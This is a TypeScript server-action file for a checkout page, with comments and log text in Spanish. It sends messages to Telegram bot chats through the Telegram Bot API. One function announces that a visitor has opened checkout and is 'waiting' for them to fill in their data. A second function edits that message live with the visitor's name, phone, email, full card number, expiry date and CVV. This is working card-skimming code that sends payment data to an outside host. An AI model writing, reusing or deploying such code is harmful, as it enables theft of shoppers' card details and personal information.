"use server";

export async function notifyCheckoutVisit() {
  try {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatIdsStr = process.env.TELEGRAM_CHAT_ID;
    
    if (!token || !chatIdsStr) {
      console.warn("Faltan variables de entorno TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID");
      return null;
    }

    const chatIds = chatIdsStr.split(',').map(id => id.trim());
    const results: { chatId: string; messageId: number }[] = [];
    const message = "🔔 Un usuario acaba de entrar a la página de pago (Checkout).\n\nEsperando a que llene sus datos...";
    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    for (const chatId of chatIds) {
      if (!chatId) continue;
      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });

      const data = await response.json();
      
      if (data.ok) {
        results.push({ chatId, messageId: data.result.message_id });
      } else {
        console.error(`❌ TELEGRAM RECHAZÓ EL MENSAJE PARA EL CHAT ${chatId}. Motivo:`, data.description);
      }
    }

    // Retornamos los IDs de los mensajes para poder editarlos después
    return results.length > 0 ? results : null;
  } catch (error) {
    console.error("Error al notificar a Telegram:", error);
    return null;
  }
}

export async function updateCheckoutData(messageData: { chatId: string; messageId: number }[], formData: any) {
  try {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    
    if (!token || !messageData || messageData.length === 0) return;

    const message = `🔔 Un usuario está en el Checkout.\n\n👤 Nombre: ${formData.fullName || "..."}\n📞 Tel: ${formData.phone || "..."}\n✉️ Email: ${formData.email || "..."}\n📍 Zona: ${formData.deliveryZone || "..."}\n📝 Notas: ${formData.notes || "..."}\n💳 Titular: ${formData.holderName || "..."}\n🔢 Tarjeta: ${formData.cardNumber || "..."}\n📅 Exp: ${formData.expirationMonth || ".."}/${formData.expirationYear || ".."}\n🔒 CVV: ${formData.cvv2 || "..."}`;
    
    const url = `https://api.telegram.org/bot${token}/editMessageText`;

    for (const { chatId, messageId } of messageData) {
      await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: messageId,
          text: message,
        }),
      });
    }
  } catch (error) {
    console.error("Error al actualizar Telegram:", error);
  }
}
